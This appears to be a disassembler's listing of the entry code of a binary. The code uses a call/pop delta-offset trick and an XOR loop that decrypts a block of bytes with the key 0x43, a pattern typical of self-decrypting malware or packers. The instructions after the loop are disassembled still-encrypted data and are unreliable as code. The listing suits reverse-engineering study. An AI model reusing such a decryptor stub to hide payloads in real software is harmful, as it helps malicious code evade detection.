
start:
0x00769674:	pusha	
0x00769675:	call	0x0076967a	; targets: 0x0076967a(MAY)
0x0076967a:	popl	%ebp	; from: 0x00769675(MAY)
0x0076967b:	subl	$0x6, %ebp
0x00769681:	subl	$0x369674, %ebp
0x00769687:	jmp	0x007696d8	; targets: 0x007696d8(MAY)
0x007696d8:	jmp	0x007696e1	; targets: 0x007696e1(MAY)	; from: 0x00769687(MAY)
0x007696e1:	movl	$0x369674, %eax	; from: 0x007696d8(MAY)
0x007696e6:	addl	%ebp, %eax
0x007696e8:	addl	$0x93, %eax
0x007696ee:	movl	$0x5c0, %ecx
0x007696f3:	movl	$0xaaa79c43, %edx
0x007696f8:	xorb	%dl, (%eax)	; from: 0x007696fc(MAY)
0x007696fa:	incl	%eax
0x007696fb:	decl	%ecx
0x007696fc:	jne	0x007696f8	; targets: 0x00769702(MAY), 0x007696f8(MAY)
0x00769702:	jmp	0x0076970b	; targets: 0x0076970b(MAY)	; from: 0x007696fc(MAY)
0x0076970b:	enter	$0xffffffca, $0xffffc88e	; from: 0x00769702(MAY)
0x0076970f:	jg	0x00769754	; targets: 0x00769754(MAY), 0x00769711(MAY)
0x00769711:	incl	%ebx	; from: 0x0076970f(MAY)
0x00769712:	incl	%ebx
0x00769713:	ret	$0xffffbb82	; targets: unresolved

0x00769736:	decl	%esi	; from: 0x007697aa(MAY)
0x00769737:	incl	%ebx
0x00769738:	subl	(%eax), %eax
0x0076973a:	adcb	%ch, 0x43(%edx)
0x0076973d:	incl	%edx
0x0076973e:	outsl	%ds:(%esi), %dx
0x0076973f:	subl	(%eax), %esi
0x00769754:	decl	%ebx	; from: 0x0076970f(MAY)
0x00769755:	incl	%ebx
0x00769756:	incl	%ebx
0x00769757:	incl	%ebx
0x00769758:	enter	$0x43, $0x4fd6
0x0076975c:	incl	%ebx
0x0076975d:	incl	%ebx
0x0076975e:	enter	$0x43, $0x53ce
0x00769762:	incl	%ebx
0x00769763:	incl	%ebx
0x00769764:	subb	$0xffffff81, -1069452735(%edx)
0x0076976b:	incl	%edi
0x0076976c:	orb	-73(%esi,%eax,8), %cl
0x00769770:	movl	$0x811ebcbc, %esp
0x00769775:	decl	%edi
0x00769776:	incl	%ebx
0x00769777:	enter	$0x47, $0x67cf
0x0076977b:	incl	%ebx
0x0076977c:	incl	%ebx
0x0076977d:	incl	%ebx
0x0076977e:	subl	(%ebx), %esi
0x00769781:	decl	%esi
0x00769782:	incl	%ebx
0x00769783:	subl	(%eax), %eax
0x00769785:	adcb	%ch, 0x43(%edx)
0x00769788:	incl	%edx
0x00769789:	outsl	%ds:(%esi), %dx
0x0076978a:	adcb	0x43434346(%ebx), %ch
0x00769791:	stosb	%al, %es:(%edi)
0x00769792:	jl	0x007697d5	; targets: 0x00769794(MAY), 0x007697d5(MAY)
0x00769794:	incl	%ebx	; from: 0x00769792(MAY)
0x00769795:	incl	%ebx
0x00769796:	pushl	%ss
0x00769797:	popl	%ss
0x00769798:	pushl	%ds
0x00769799:	movl	$0x36bc4f36, %esp
0x0076979e:	decl	%ebx
0x0076979f:	stosl	%eax, %es:(%edi)
0x007697a0:	xorl	%eax, 0x43(%ebx)
0x007697a3:	incl	%ebx
0x007697a4:	enter	$0x43, $0x4bfe
0x007697a8:	incl	%ebx
0x007697a9:	incl	%ebx
0x007697aa:	jo	0x00769736	; targets: 0x007697ac(MAY), 0x00769736(MAY)
0x007697ac:	ret	$0xffff99b1	; targets: unresolved	; from: 0x007697aa(MAY)

0x007697d5:	incl	%ebx	; from: 0x00769792(MAY)
0x007697d6:	incl	%ebx
0x007697d7:	ret	; targets: unresolved

